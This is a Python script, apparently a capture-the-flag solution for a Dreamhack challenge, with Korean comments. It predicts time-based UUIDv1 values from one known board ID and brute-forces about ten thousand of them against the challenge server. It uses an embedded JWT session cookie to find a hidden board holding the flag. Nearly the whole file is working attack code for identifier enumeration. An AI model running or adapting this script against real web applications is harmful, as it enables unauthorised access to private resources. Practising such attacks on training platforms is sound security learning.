import uuid
import requests
import time

# ==========================================
# 1. 알아낸 정보들을 아래에 입력해주세요.
# ==========================================
free_board_id_str = "d8818dac-2d91-11f1-9390-aafc00001c01" # 사용자가 찾아낸 자유게시판 UUID
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NzUwMjQyMDAsImV4cCI6MTc3NTAyNzgwMCwidXNlcm5hbWUiOiJoYWNrZXIiLCJzY2hvb2wiOiJcdWI0ZGNcdWI5YmNcdWIzMDBcdWQ1NTlcdWFkNTAifQ.mEUWkCz2bm8LJ1rPFExSoCK3LC_USRf1WfJGRmHvLAg"
target_url_base = "http://host8.dreamhack.games:18475/s/드림대학교/" # 실제 문제 서버 주소로 변경하세요

print("="*70)
print("[DEBUG] 쌍둥이 UUIDv1 고속 예측 공격 (Fast Brute-force) 시작")
print("="*70)

base_uuid = uuid.UUID(free_board_id_str)
base_time = base_uuid.time
node = base_uuid.node
clock_seq_hi = base_uuid.clock_seq_hi_variant
clock_seq_low = base_uuid.clock_seq_low

print(f"\n[DEBUG] 1. 타겟 UUID 정보")
print(f" - Base UUID : {base_uuid}")
print(f" - Base Time : {base_time}")

# 세션을 사용하면 TCP 커넥션을 유지하므로 탐색 속도가 엄청나게 빨라집니다.
session = requests.Session()
session.cookies.set("token", token)

# 예측 범위 확장: 보통 +방향으로 증가하지만, 간혹 변수가 있을 수 있으므로 -100부터 +10000까지 넉넉하게 잡습니다.
search_offsets = list(range(1, 10001)) + list(range(-100, 0))
total_count = len(search_offsets)

print(f"\n[DEBUG] 2. 브루트포스 설정 완료")
print(f" - 탐색 범위 : Offset -100 ~ +10000 (총 {total_count}개)")
print(f" - 세션 쿠키 : {session.cookies.get_dict()}")
print("\n[DEBUG] 3. 고속 탐색 시작...\n")

start_time = time.time()

for idx, offset in enumerate(search_offsets, 1):
    new_time = base_time + offset
    
    time_low = new_time & 0xffffffff
    time_mid = (new_time >> 32) & 0xffff
    time_hi_version = (new_time >> 48) & 0x0fff
    
    new_uuid = uuid.UUID(
        fields=(time_low, time_mid, time_hi_version, clock_seq_hi, clock_seq_low, node), 
        version=1
    )
    
    guess = str(new_uuid)
    test_url = f"{target_url_base}{guess}"
    
    # 디버깅을 위해 50번 시도마다 한 번씩 현재 진행 상태를 상세히 출력합니다.
    if idx % 50 == 0:
        elapsed = time.time() - start_time
        print(f"[진행도] {idx}/{total_count} 시도 완료 | 현재 Offset: {offset} | 경과 시간: {elapsed:.2f}초 | 대상: {guess}")
        
    try:
        # Session을 사용하여 고속으로 요청을 보냅니다 (time.sleep 제거)
        res = session.get(test_url)
        
        if res.status_code == 200:
            elapsed = time.time() - start_time
            print("\n" + "="*70)
            print("🎉 [SUCCESS] HTTP 200 OK - 비밀게시판 발견!")
            print("="*70)
            print(f" 🎯 적중 Offset : {offset}")
            print(f" 🕒 소요 시간   : {elapsed:.2f}초")
            print(f" 🔑 타겟 UUID   : {guess}")
            print(f" 🔗 직접 접속 URL: {test_url}")
            print("="*70)
            print("\n[!] 공격 성공! 브라우저 주소창에 위 URL을 입력하여 FLAG가 담긴 게시물을 확인하세요!")
            break
            
    except requests.exceptions.RequestException as e:
        print(f"\n🚨 [ERROR] 네트워크 오류 발생 (Offset: {offset}): {e}")
        break

else:
    print("\n[FAIL] 지정된 범위 내에서 비밀게시판을 찾지 못했습니다. 범위를 더 늘려보거나 토큰/URL을 다시 확인해주세요.")